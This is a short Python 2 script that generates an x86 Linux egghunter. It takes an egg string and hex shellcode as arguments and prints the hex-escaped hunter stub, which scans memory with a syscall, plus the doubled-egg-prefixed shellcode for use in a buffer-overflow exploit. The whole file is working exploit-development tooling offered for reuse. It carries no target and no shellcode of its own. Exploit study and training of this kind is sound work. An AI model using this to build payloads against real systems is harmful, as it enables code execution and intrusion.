#!/usr/bin/python

#You are free to use and redistribute this code as you wish

import sys

egg = sys.argv[1]

x = sys.argv[2].split('x')

shellcode = ''

for i in x:

	if i != "":
		shellcode = shellcode + "\\x" + i

encoded_egg = ""

for i in egg:

	encoded_egg = encoded_egg + "\\x" + hex(ord(i)).split("x")[1]

doubled_egg = encoded_egg + encoded_egg

egghunter = "\\x66\\x81\\xc9\\xff\\x0f\\x41\\x75\\x01\\x41\\x6a\\x43\\x58\\xcd\\x80\\x3c\\xf2\\x74\\xee\\xb8" + encoded_egg +"\\x89\\xcf\\xaf\\x75\\xe9\\xaf\\x75\\xe6\\xff\\xe7";


print "Egghunter: " + egghunter

print "Egg and shellcode:" + doubled_egg + shellcode
